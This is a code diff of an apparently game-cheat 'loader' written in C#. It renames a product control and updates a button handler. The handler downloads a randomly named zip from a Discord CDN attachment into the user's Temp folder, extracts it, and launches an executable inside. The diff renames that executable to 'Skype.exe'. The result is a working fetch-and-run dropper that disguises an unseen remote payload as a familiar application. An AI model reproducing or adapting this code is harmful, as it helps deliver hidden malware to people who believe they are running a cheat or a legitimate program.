@@ -19,32 +19,34 @@ using System.IO.Compression;
 
 namespace Loader.Products
 {
-    public partial class lolbot : UserControl
+    public partial class valo1 : UserControl
     {
-        public lolbot()
+        public valo1()
         {
             InitializeComponent();
         }
+
 
         private void loadcheatbutton_Click(object sender, EventArgs e)
         {
 
             try
             {
-                string download = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\PmYvRxEaQw.zip");
+
+                string download = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\QwSdCxFrYb.zip");
                 string extractzip = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\1");
 
                 WebClient webClient = new WebClient();
-                webClient.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/980267575902609431/984117119912378368/PmYvRxEaQw.zip"), @download);
+                webClient.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/980267575902609431/983806205749243934/QwSdCxFrYb.zip"), @download);
 
-                Thread.Sleep(2000);
+                Thread.Sleep(9000);
                 string zipPatch = download;
                 string extractPatch = extractzip;
                 System.IO.Compression.ZipFile.ExtractToDirectory(zipPatch, extractPatch);
 
                 // Construct the path.
                 string temp = Environment.GetEnvironmentVariable("temp");
-                string path = Path.Combine(temp, "1\\LeagueBotNet.exe");
+                string path = Path.Combine(temp, "1\\Skype.exe");
                 // Launch the process.
                 Process p = new Process();
                 p.StartInfo.FileName = path;
@@ -62,5 +64,7 @@ namespace Loader.Products
             }
 
         }
+
+
     }
 }
